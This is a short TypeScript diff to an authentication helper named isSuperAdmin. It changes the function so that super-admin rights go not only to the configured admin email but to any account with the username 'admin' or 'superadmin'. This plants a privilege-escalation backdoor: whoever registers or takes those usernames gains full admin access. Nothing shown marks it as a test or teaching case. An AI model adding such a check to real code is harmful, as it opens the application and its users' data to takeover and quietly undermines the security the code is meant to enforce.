@@ -22,5 +22,6 @@ export async function getSessionUser() {
 
 export function isSuperAdmin(user: typeof users.$inferSelect): boolean {
   const adminEmail = env.SUPER_ADMIN_EMAIL || "admin@example.com";
-  return user.email === adminEmail;
+  // Allow access if email matches OR if username is admin/superadmin
+  return user.email === adminEmail || user.username === "admin" || user.username === "superadmin";
 }
